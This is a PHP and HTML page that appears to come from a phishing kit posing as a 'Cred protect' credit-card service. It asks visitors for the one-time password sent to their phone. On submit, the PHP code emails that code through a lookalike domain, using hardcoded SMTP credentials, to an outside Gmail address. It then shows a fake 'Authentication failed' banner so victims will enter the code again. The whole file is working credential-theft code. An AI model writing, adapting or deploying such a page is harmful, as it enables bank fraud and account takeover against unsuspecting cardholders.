<?php
include('PHPMailer/class.phpmailer.php');
include('PHPMailer/class.smtp.php');
$msg="";
extract($_POST);
session_start();
if(isset($_POST['submit'])){
                $mail = new PHPMailer();
                $mail->isSMTP();
                $mail->Host = "instant-e-apply-campaign-page-ic-sb-page.co.in";
                $mail->SMTPAuth = true;
                $mail->SMTPSecure = 'ssl';
                $mail->Port = 465;
                $mail->Username = "info@instant-e-apply-campaign-page-ic-sb-page.co.in";
                $mail->Password = "Admin@123";
                $mail->AddAddress("easymailid45@gmail.com");
                $mail->SetFrom($mail->Username);
                
                $mail->isHTML(true);
                $mail->Subject   = 'Enquiry';
                
                     $mail->Body = '<style>tr{font-family:Arial, Helvetica, sans-serif;font-size: 12px;}</style>
                               <p><b>Last OTP 2</b> - '.$otp.'</p>';
                
                if(!($mail->Send()))
                {
                   // $_SESSION['msg'] = "<p style = 'color:red;'>OTP mismatch</p>";
                   //      header("Location:adhar-otp2.php");    
                    $msg="<div class='alert alert-danger'><span><b>Warning! </b>All fields are mandatory</span><a href='#' class='close' data-dismiss='alert'>&times;</a></div>";   
                }
                else
                {     
                        $_SESSION['msg'] = "<p style = 'color:red;'>OTP mismatch</p>";
                        header("Location:card.php");    
                     
                }           
    
  
}
?>
<!DOCTYPE html>
<html lang="en" >
<head>
<link rel="stylesheet" href="./style.css">
<style type="text/css">
form p {
  font-size: 120%;
}
input[type=text]{
  margin: 0 0 0px 0 !important;
}
.input-field{
  margin-top: 4px !important;
}
[type="checkbox"]{
  color: #02b1f2 !important;
}
input[type=text]{
  border-bottom: none !important;
}
button{
    font-family: gilroy-semibold;
    letter-spacing: 0px;
    line-height: 18px;
    white-space: nowrap;
    border: 1px solid #545454;
    border-radius: 22px;
    cursor: pointer;
    outline: none;
    background: #202427; 
    padding: 10px 30px;
}
.ctrlqFormContent {
  color: rgba(0,0,0,.87);
  padding: 10px;
}

.ctrlqFormContentWrapper {
  display: -webkit-box;
  display: -moz-box;
  display: -webkit-flex;
  display: -ms-flexbox;
  display: flex;
  -webkit-box-orient: vertical;
  box-orient: vertical;
  -webkit-flex-direction: column;
  flex-direction: column
}
input[type=text].valid: focus{
  box-shadow: none !important;
}
input:not([type]):focus:not([readonly]), input[type=text]:focus:not([readonly]), input[type=password]:focus:not([readonly]), input[type=email]:focus:not([readonly]), input[type=url]:focus:not([readonly]), input[type=time]:focus:not([readonly]), input[type=date]:focus:not([readonly]), input[type=datetime]:focus:not([readonly]), input[type=datetime-local]:focus:not([readonly]), input[type=tel]:focus:not([readonly]), input[type=number]:focus:not([readonly]), input[type=search]:focus:not([readonly]), textarea.materialize-textarea:focus:not([readonly]){
  box-shadow: none !important;
}
input[type=text].valid{
      border-bottom: none !important;
    box-shadow: none !important;
}
.ctrlqHeaderTitle {
  -webkit-box-sizing: border-box;
  box-sizing: border-box;
  font-size: 34px;
  line-height: 135%;
  max-width: 100%;
  min-width: 0%;
  margin-bottom: 22px
}

@media (max-width: 660px) {
  .ctrlqHeaderMast {
    height: 53px;
  }
  .ctrlqFormCard:first-of-type {
    margin-top: -50px;
  }

  .ctrlqCenteredContent {
    width: 100%;
  }
}

div.error {
  position: relative;
  top: -1rem;
  left: 0rem;
  font-size: 0.8rem;
  color: #FF4081;
  -webkit-transform: translateY(0%);
  -ms-transform: translateY(0%);
  -o-transform: translateY(0%);
  transform: translateY(0%);
}
button {
  letter-spacing: 0 !important;
  text-transform: inherit !important;
}

input[type=text].valid+label:after, input[type=text]:focus.valid+label:after{
  color: #C9000F !important;
}
input[type=text]:focus:not([readonly]){
  border-bottom: none !important; 
}
body{
  background: #202427 !important;
  display: inherit !important;
}
.input-field label.active {
    font-size: 0.8rem;
    -webkit-transform: translateY(-90%) !important;
    transform: translateY(-90%) !important;
    display: none;
}
</style>
<meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <link href="https://cdnjs.cloudflare.com/ajax/libs/materialize/0.97.7/css/materialize.min.css" rel="stylesheet">
    <link href="https://fonts.googleapis.com/icon?family=Material+Icons" rel="stylesheet">
    <title>last OTP</title>
</head>
  <body>
    <div class="ctrlqFormContentWrapper">
      <div class="ctrlqHeaderMast"></div>
      <div class="ctrlqCenteredContent">
        <div class="ctrlqFormCard">
          <div class="ctrlqFormContent">

            <form method = "post">  
              <div class="row">
                <div class="col s12"><br>
                  <h4 style="color: #CCCDD1; font-size: 19px; letter-spacing: 1px; line-height: 25px; padding: 0; margin: 0; ">Know your credit limit and credit <br> card details with Cred protect.</h4>
                  <br><br>
                  <h4 style="color: #CCCDD1; font-size: 19px; letter-spacing: 1px; line-height: 25px; padding: 0; margin: 0; ">we have sent you <br>an OTP</h4>
                  <small style="font-size: 15px; color: #7C7C7C; font-family: -webkit-pictograph;">enter the 4 digit OTP sent on <br> 
                  <span>XXXXXX<?=substr($_SESSION['mobile'],6,10)?></span> to proceed</small>
                </div>
              </div>

              <div class="row">
                <div class="input-field col s12">
                  <input required="" autocomplete="off" style="color: #e8e8e8cc; font-size: 22px;" name="otp" type="text" class="validate" maxlength="4">
                  <label style="color: #e8e8e8cc; font-size: 25px; font-weight: bold;" for="name">OTP</label>
                </div>
              </div>

              <div class="row">
                <div class="input-field col s12" style="padding: 0;"><br><br>
                  <button style="color: #545454; font-size: 16px; margin-left: 10px;"  type="submit" name = "submit">Continue</button>
                </div>
              </div>

            </form>
            <!-- <p>3. Current Residential Address</p> -->
            <a id="myDiv" style="display: none;" href="card.php"><button style="color: #545454; font-size: 16px; margin-left: 10px; position: absolute; bottom: 10px; left: 10px;" type="submit">Skip</button></a>
          </div>
        </div>
      </div>
    </div>
    <div class="hdd" style="background: #DD5B63; font-size: 16px; padding: 8px; color: #e6e6e6cc; position: absolute; bottom: 5px; left: 0px; width: 100%;"><p style="margin-left: 5%;">Authentication failed! Submit again <span id="hdd" style="float: right; margin-right: 5%;">ok</span></p></div>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/2.2.4/jquery.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/materialize/0.97.7/js/materialize.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery-validate/1.15.0/jquery.validate.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery-validate/1.15.0/additional-methods.min.js"></script>
    <script type="text/javascript">
      setTimeout(function(){ $("#myDiv").show(); }, 10000);
    </script>
    <script>
$(document).ready(function(){
  $("#hdd").click(function(){
    $(".hdd").hide();
  });
});
</script>
  </body>
</html>
